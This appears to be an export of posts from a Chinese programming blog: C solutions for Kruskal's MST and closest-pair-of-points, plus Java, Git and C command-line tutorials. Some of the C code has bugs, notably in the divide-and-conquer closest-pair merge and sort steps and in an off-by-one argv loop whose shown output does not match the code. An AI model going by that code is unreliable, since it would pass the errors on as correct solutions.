<h2 id="求解："><a href="#求解：" class="headerlink" title="求解："></a>求解：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-01-21 11:11:04</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-10 22:51:47</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\luo_gu\P3366.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  //利用kruskal算法</span></span></span><br><span class="line"><span class="keyword">int</span> arc[<span class="number">200001</span>][<span class="number">3</span>], n, m;  <span class="comment">// arc的最后一个代表权值，前两个代表邻接点</span></span><br><span class="line"><span class="keyword">int</span> arc_index[<span class="number">200001</span>];  <span class="comment">//存放边的编号,排序后得到的是按照边权值升序的编号</span></span><br><span class="line"><span class="keyword">int</span> anc[<span class="number">200001</span>];  <span class="comment">//并查集辅助数组,存放每一个点属于的集合</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_anc</span><span class="params">(<span class="keyword">int</span> son)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (anc[son] == son)</span><br><span class="line">        <span class="keyword">return</span> son;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//压缩路径</span></span><br><span class="line">        anc[son] = find_anc(anc[son]);</span><br><span class="line">        <span class="keyword">return</span> anc[son];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_sort</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left &gt;= right) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> l = left, r = right, piv = arc_index[left];</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r &amp;&amp; arc[arc_index[r]][<span class="number">2</span>] &gt;= arc[piv][<span class="number">2</span>]) r--;</span><br><span class="line">        arc_index[l] = arc_index[r];</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r &amp;&amp; arc[arc_index[l]][<span class="number">2</span>] &lt;= arc[piv][<span class="number">2</span>]) l++;</span><br><span class="line">        arc_index[r] = arc_index[l];</span><br><span class="line">    &#125;</span><br><span class="line">    arc_index[l] = piv;</span><br><span class="line">    q_sort(left, l - <span class="number">1</span>);</span><br><span class="line">    q_sort(r + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) anc[i] = i;  <span class="comment">//刚开始每一个点是单独的集合</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;arc[i][<span class="number">0</span>], &amp;arc[i][<span class="number">1</span>], &amp;arc[i][<span class="number">2</span>]);</span><br><span class="line">        arc_index[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    q_sort(<span class="number">0</span>, m - <span class="number">1</span>);          <span class="comment">//将边的权值排序</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;  <span class="comment">//依次把最小的边进行“并”</span></span><br><span class="line">        <span class="comment">// 如果同属于“祖先”，则跳过</span></span><br><span class="line">        <span class="keyword">if</span> (find_anc(arc[arc_index[i]][<span class="number">1</span>]) == find_anc(arc[arc_index[i]][<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 如果不同，则说明是符合，可以添加</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            anc[find_anc(anc[arc[arc_index[i]][<span class="number">0</span>]])] = arc[arc_index[i]][<span class="number">1</span>];</span><br><span class="line">            sum += arc[arc_index[i]][<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment">1 2 2</span></span><br><span class="line"><span class="comment">1 3 8</span></span><br><span class="line"><span class="comment">1 4 3</span></span><br><span class="line"><span class="comment">2 3 4</span></span><br><span class="line"><span class="comment">3 4 3</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的环境配置（Windows系统）</title>
    <url>/2020/04/07/Java%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%88Windows%E7%B3%BB%E7%BB%9F%EF%BC%89/</url>
    <content><![CDATA[<h2 id="下载安装jdk"><a href="#下载安装jdk" class="headerlink" title="下载安装jdk"></a>下载安装jdk</h2><p><a href="https://www.oracle.com/java/technologies/javase-downloads.html" target="_blank" rel="noopener">甲骨文官网</a></p>
<p>从甲骨文下载好后，安装过程把安装的路径记住，或者更改到自己喜欢的路径。</p>
<h2 id="新建系统变量"><a href="#新建系统变量" class="headerlink" title="新建系统变量"></a>新建系统变量</h2><p>右击“此电脑”，依次点击“属性”，“高级系统设置”，“环境变量”，在“系统变量”处新建以下变量：<a id="more"></a></p>
<table>
<thead>
<tr>
<th>变量名</th>
<th>变量值</th>
</tr>
</thead>
<tbody><tr>
<td>JAVA_HOME</td>
<td>jdk的位置，如<code>D:\Java\jdk-14</code></td>
</tr>
<tr>
<td>CLASSPATH</td>
<td><code>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</code></td>
</tr>
</tbody></table>
<p> <strong>jdk1.5版本以上不需要设置<code>CLASSPATH</code>变量</strong></p>
<p>如果在<code>jdk</code>安装目录下没有<code>jre</code>的文件下，只要在命令行模式下进入该<code>jdk</code>的安装目录，输入下面的命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin\jlink.exe --module-path jmods --add-modules java.desktop --output jre</span><br></pre></td></tr></table></figure>

<p>就可以生成了<code>jre</code>的相关文件了。</p>
<p>然后在<code>path</code>变量中添加两条变量值：</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586233918848.png" alt="1586233918848"></p>
<p>并且<code>%JAVA_HOME%\bin</code>必须在前面，否则可能出现下面这种错误：</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586234001560.png" alt="1586234001560"></p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>在命令行中输入下面的命令，能正常显示版本号就说明环境配置成功了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Git和远程仓库建立连接</title>
    <url>/2020/04/06/Git%E5%92%8C%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5/</url>
    <content><![CDATA[<p>今天因为一些不可抗力因素重装了系统，发现<code>git</code>环境丢失了，就不得不重新配置一下<code>git</code>，顺便把过程写下来吧。</p>
<h2 id="git下载安装"><a href="#git下载安装" class="headerlink" title="git下载安装"></a>git下载安装</h2><p>安装过程直接默认，一直<code>next</code>就可以了。<a id="more"></a></p>
<h2 id="代码托管平台账号注册"><a href="#代码托管平台账号注册" class="headerlink" title="代码托管平台账号注册"></a>代码托管平台账号注册</h2><p><code>git</code>下载安装期间到第三方代码托管平台注册账户，开启一个远程仓库，记住该远程仓库的链接。</p>
<p>以码云为例：</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586182061136.png" alt="仓库截图"></p>
<h2 id="设置用户名和邮箱"><a href="#设置用户名和邮箱" class="headerlink" title="设置用户名和邮箱"></a>设置用户名和邮箱</h2><p>在<code>cmd</code>命令行或者用安装<code>git</code>时自带的<code>Git bash</code>输入下面的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name "根据自己喜好进行设置用户名" </span><br><span class="line">git config --global user.email "自己常用的邮箱"</span><br></pre></td></tr></table></figure>

<h2 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "这里换上你的邮箱"</span><br></pre></td></tr></table></figure>

<p>上面这条命令在<code>cmd</code>命令行下可能会失败，用安装<code>git</code>时自带的<code>Git bash</code>就可以成功了，然后按照提示按下三次回车。</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586182931481.png" alt="密钥图片"></p>
<h2 id="第三方平台添加密钥"><a href="#第三方平台添加密钥" class="headerlink" title="第三方平台添加密钥"></a>第三方平台添加密钥</h2><p>将上述生成的<code>/c/Users/YaleXin/.ssh/id_rsa.pub</code>文件中的内容复制，打开码云，在设置 –&gt;SSH公钥处粘贴所复制的内容。</p>
<h2 id="初始化本地仓库"><a href="#初始化本地仓库" class="headerlink" title="初始化本地仓库"></a>初始化本地仓库</h2><p>在需要的地方地方打开<code>Git bash</code>，输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>



<h2 id="将本地修改提交到远程仓库"><a href="#将本地修改提交到远程仓库" class="headerlink" title="将本地修改提交到远程仓库"></a>将本地修改提交到远程仓库</h2><p>随便修改一个文件，如新建一个<code>test.txt</code>，然后在<code>Git bash</code>输入下面的命令：</p>
<p>暂存更改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure>

<p>提交更改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m "你的提交备注"</span><br></pre></td></tr></table></figure>

<p>连接远程仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin 你的远程仓库地址</span><br></pre></td></tr></table></figure>

<p>可以使用<code>HTTPS</code>或者<code>SSH</code>的方式。</p>
<p>从远程仓库拉取（若远程仓库没有任何数据，可以跳过这个步骤，否则输入：）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>推送到远端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>

<p>上面的命令是第一次提交的时候使用的命令，假如是非第一次，直接使用<code>git push</code>即可</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>最小点对</title>
    <url>/2020/04/02/%E6%9C%80%E5%B0%8F%E7%82%B9%E5%AF%B9/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>对于给定的n个点，求出这些点的最小的距离。</p>
<h2 id="解法一：暴力法"><a href="#解法一：暴力法" class="headerlink" title="解法一：暴力法"></a>解法一：暴力法</h2><p>遍历任意两点之间的距离，找出最小值。<a id="more"></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 20:37:23</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 21:23:54</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">distance</span><span class="params">(<span class="keyword">double</span> x1, <span class="keyword">double</span> y1, <span class="keyword">double</span> x2, <span class="keyword">double</span> y2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x, y;</span><br><span class="line">&#125; mPoint;</span><br><span class="line">mPoint p[<span class="number">120</span>], mid[<span class="number">120</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf %lf"</span>, &amp;p[i].x, &amp;p[i].y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> <span class="built_in">min</span> = <span class="number">9999.0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">double</span> t = distance(p[i].x, p[i].y, p[j].x, p[j].y);</span><br><span class="line">            <span class="built_in">min</span> = <span class="built_in">min</span> &lt; t ? <span class="built_in">min</span> : t;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lf"</span>, <span class="built_in">min</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>算法复杂度是：O（n<sup>2</sup>）</p>
<h2 id="解法二：分治法"><a href="#解法二：分治法" class="headerlink" title="解法二：分治法"></a>解法二：分治法</h2><ol>
<li>先将点集按照x坐标的大小进行排序</li>
<li>递归进行3，4，5步骤</li>
<li>取一条中线，将点集分成左右两部分，尽量把点集分为数量相同的两半，找出左边最小的点距离DL和右边最小的点距离DR，取二者的较小者minD=min(DL,DR)</li>
<li>合并：以中线为中心，半径为minD做圆，将左右两边的点中处于该圆的点保存在一个数组中，求出这些点中的最小距离，关于这个距离，可以先按照y坐标的大小进行排序，接着， 对于每一个点P0(x1,y1)，只要计算出紧接在P0后面的6个点和P0之间的距离，取较小值，该值就是P0和距离DR中的点的最小值（假设P0在DL），计算该数组中的每一个点的最小值，并找出在这里边的最小值m。</li>
<li>取m和minD的较小者，即为所求。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 15:59:50</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 21:03:04</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 交换两个数的宏定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swap(a, b)    \</span></span><br><span class="line">    &#123;                 \</span><br><span class="line">        mPoint t = a; \</span><br><span class="line">        a = b;        \</span><br><span class="line">        b = t;        \</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 计算两个点之间的距离函数</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">distance</span><span class="params">(<span class="keyword">double</span> x1, <span class="keyword">double</span> y1, <span class="keyword">double</span> x2, <span class="keyword">double</span> y2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x, y;</span><br><span class="line">&#125; mPoint;</span><br><span class="line">mPoint p[<span class="number">100</span>], mid[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_sort</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> i = l, j = i + <span class="number">1</span>;</span><br><span class="line">    mPoint key = p[l];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[j].x &lt;= key.x) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(p[i], p[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(p[l], p[i]);</span><br><span class="line">    q_sort(l, i - <span class="number">1</span>);</span><br><span class="line">    q_sort(i + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_sort_y</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> i = l, j = i + <span class="number">1</span>;</span><br><span class="line">    mPoint key = mid[l];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mid[j].y &lt;= key.y) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(mid[i], mid[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(mid[l], mid[i]);</span><br><span class="line">    q_sort(l, i - <span class="number">1</span>);</span><br><span class="line">    q_sort(i + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">find_minD</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (r - l == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">double</span> d1, d2, d3;</span><br><span class="line">        d1 = distance(p[l].x, p[l].y, p[r + <span class="number">1</span>].x, p[r + <span class="number">1</span>].y);</span><br><span class="line">        d2 = distance(p[l].x, p[l].y, p[r].x, p[r].y);</span><br><span class="line">        d3 = distance(p[l + <span class="number">1</span>].x, p[l + <span class="number">1</span>].y, p[r].x, p[r].y);</span><br><span class="line">        d1 = d1 &lt; d2 ? d1 : d2;</span><br><span class="line">        d1 = d1 &lt; d3 ? d1 : d3;</span><br><span class="line">        <span class="keyword">return</span> d1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (l + <span class="number">1</span> == r) &#123;</span><br><span class="line">        <span class="keyword">return</span> distance(p[l].x, p[l].y, p[r].x, p[r].y);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 分别是距离中线距离小于min的点的数量、中线位置</span></span><br><span class="line">        <span class="keyword">int</span> number = <span class="number">0</span>, mid_x = p[(l+r)/<span class="number">2</span>].x;</span><br><span class="line">        <span class="keyword">double</span> Lmin, Rmin, <span class="built_in">min</span>, mid_min = <span class="number">32767</span>;</span><br><span class="line">        Lmin = find_minD(l, (l+r) / <span class="number">2</span>);</span><br><span class="line">        Rmin = find_minD((l+r) / <span class="number">2</span> + <span class="number">1</span>, r);</span><br><span class="line">        <span class="built_in">min</span> = Lmin &lt; Rmin ? Lmin : Rmin;</span><br><span class="line">        <span class="comment">// 以中线为为中心，寻找左右两边中距离中线距离小于等于min的点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt;= r; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((p[i].x - mid_x) &lt; <span class="built_in">min</span>) &#123;</span><br><span class="line">                mid[number++] = p[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将得到的数组根据坐标y的值进行排序 求出该数组中最小点对值</span></span><br><span class="line">        <span class="keyword">if</span> (number &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            q_sort_y(<span class="number">0</span>, number - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; number; j++) &#123;</span><br><span class="line">                    <span class="keyword">double</span> t = distance(p[i].x, p[i].y, p[j].x, p[j].y);</span><br><span class="line">                    mid_min = mid_min &lt; t ? mid_min : t;</span><br><span class="line">                    <span class="keyword">if</span> (++count &gt; <span class="number">7</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span> &lt; mid_min ? <span class="built_in">min</span> : mid_min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> min_d;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf %lf"</span>, &amp;p[i].x, &amp;p[i].y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//先按照x坐标进行排序</span></span><br><span class="line">    q_sort(<span class="number">1</span>, n);</span><br><span class="line">    </span><br><span class="line">    min_d = find_minD(<span class="number">1</span>, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lf"</span>,min_d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>算法复杂度是：O（nlogn）</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>分治</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言向main函数传递参数</title>
    <url>/2020/04/02/C%E8%AF%AD%E8%A8%80%E5%90%91main%E5%87%BD%E6%95%B0%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<p>我们一般写C语言的代码的时候，<code>main</code>函数是不带形参的，如<a id="more"></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description: </span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 11:16:47</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 12:44:54</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是其实我们是可以向<code>main</code>函数传递参数的，只不过此时我们需要在命令行中进行编译运行，例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 11:16:47</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 12:52:16</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> arc, <span class="keyword">char</span>* input[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"您输入了%d个参数，分别是：\n"</span>, arc);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= arc; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, input[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在命令行中，进入到程序所在的文件夹下，输入编译命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./test 参数一 参数二 参数三</span><br></pre></td></tr></table></figure>

<p>输出的结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">您输入了4个参数，分别是：</span><br><span class="line">D:\my_c_workspace\some_test\test.exe</span><br><span class="line">参数一</span><br><span class="line">参数二</span><br><span class="line">参数三</span><br></pre></td></tr></table></figure>

<p>可以发现第一个参数实际上是命令本身（虽然说它的下标是0）！</p>
<p>我们可以借助上面的方法给<code>main</code>函数进行传递参数，接着进行类型转换就可以得到我们想要的数据类型。</p>
]]></content>
      <categories>
        <category>命令行</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>博客转移</title>
    <url>/2020/03/26/%E5%8D%9A%E5%AE%A2%E8%BD%AC%E7%A7%BB/</url>
    <content><![CDATA[<p>现在是2020年3月26日，前几天搭建好了typecho的博客，把Hexo下的文章全都转移了过去，接着又是换主题，小修改，终于算是满意了，我为什么要进行博客转移？</p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因<a id="more"></a></h2><p>最近新冠肺炎不断肆虐各国各地区，各地都在积极采取措施，在这里我要感谢奋斗在一线的医生护士们，你们辛苦了，你们是最棒的！阿里云为了鼓励大家利用在家的时间多多学习，推出了<a href="https://developer.aliyun.com/adc/student/" target="_blank" rel="noopener">高校学生“在家实践”计划活动</a>,，只要是在校大学生，通过测试就可以领取六个月的服务器ECS，2核cpu+4GB内存+1M宽带+40GB的系统盘，这个配置算下来应该也要五六百吧人民币。但是我领取了以后也不知道拿来干嘛，我之前搭建的Hexo博客不需要服务器就可以搭建，所以服务器就一直闲置着。前几天刚好看到一个IT之家网友分享的typecho博客，然后就想搭建一个，也不算是浪费了服务器。然后一番折腾终于搭建好了，主题用的是<a href="https://eriri.ink/archives/Typecho-Theme-Aria.html" target="_blank" rel="noopener">Aria</a>。但是截止到今天，我的域名备案还没通过，所以typecho的博客还是利用我的服务器IP来进行访问。</p>
<p>这是我的<a href="http://47.92.93.189/" target="_blank" rel="noopener">typecho博客</a>，主题是<a href="https://eriri.ink/archives/Typecho-Theme-Aria.html" target="_blank" rel="noopener">Aria</a></p>
<p>这是我的<a href="https://yalexin.gitee.io/">Hexo博客</a>，主题是<a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">Next</a></p>
<p>目前是文章两边同时更新，所以就相当于同一个博客不同主题吧（<del>~</del>）。</p>
<h2 id="这二者博客的区别"><a href="#这二者博客的区别" class="headerlink" title="这二者博客的区别"></a>这二者博客的区别</h2><ul>
<li><p>Hexo</p>
<ul>
<li>它基于node.js，是一个静态博客，关于什么是静态web和动态web，<a href="https://blog.csdn.net/qq_33915826/article/details/81172555" target="_blank" rel="noopener">这里</a>有说明，Hexo比较轻量，访问速度比较快，托管方便，几乎不用担心数据丢失的问题，在没有服务器情况下也可以搭建。</li>
<li>但是每次发布文章都要输入命令，重新渲染成HTML文件</li>
<li>移动端写文章不太方便</li>
</ul>
</li>
<li><p>Typecho</p>
<ul>
